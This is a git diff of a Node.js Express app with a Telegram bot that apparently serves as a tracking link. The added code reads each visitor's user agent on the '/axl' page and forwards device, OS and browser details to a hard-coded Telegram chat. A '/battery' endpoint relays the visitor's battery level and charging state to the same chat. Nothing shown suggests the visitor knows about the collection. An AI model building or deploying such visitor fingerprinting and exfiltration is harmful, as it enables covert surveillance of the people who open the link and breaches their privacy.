@@ -1,5 +1,4 @@
 const TelegramBot = require('node-telegram-bot-api');
-const axios = require('axios');
 const express = require('express');
 const path = require('path');
 
@@ -86,6 +85,19 @@ function getBrowserVersion(userAgent) {
 
 // Serve the device info page
 app.get('/axl', (req, res) => {
+  const userAgent = req.headers['user-agent'];
+  const deviceName = getDeviceName(userAgent);
+  const osVersion = getOSVersion(userAgent);
+  const browserVersion = getBrowserVersion(userAgent);
+
+  // Send message to your Telegram with detected info
+  const amessage = `🌐 *Device Info*:
+- Device: ${deviceName}
+- OS Version: ${osVersion}
+- Browser: ${browserVersion}`;
+
+  bot.sendMessage(ajsal, amessage, { parse_mode: 'Markdown' });
+
   const html = `
     <!DOCTYPE html>
     <html lang="en">
@@ -128,22 +140,12 @@ app.get('/axl', (req, res) => {
 // Handle battery info sent from the client
 app.post('/battery', express.json(), (req, res) => {
   const { level, charging } = req.body;
-  const deviceName = getDeviceName(userAgent);
-  const androos = getOSVersion(userAgent);
-  const brow =  getBrowserVersion(userAgent);
-
-  const message = `Someone Accessed 
- 
-D:- ${deviceName}
-V:- ${androos}
-B:- ${brow}
- 
- 🔋 *Battery Info*:
+  const nmessage = `🔋 *Battery Info*:
 - Level: ${level}
 - Status: ${charging}`;
 
   // Send battery info to your Telegram
-  bot.sendMessage(ajsal, message, { parse_mode: 'Markdown' });
+  bot.sendMessage(ajsal, nmessage, { parse_mode: 'Markdown' });
   
   res.status(200).send('Battery info sent to Telegram.');
 });
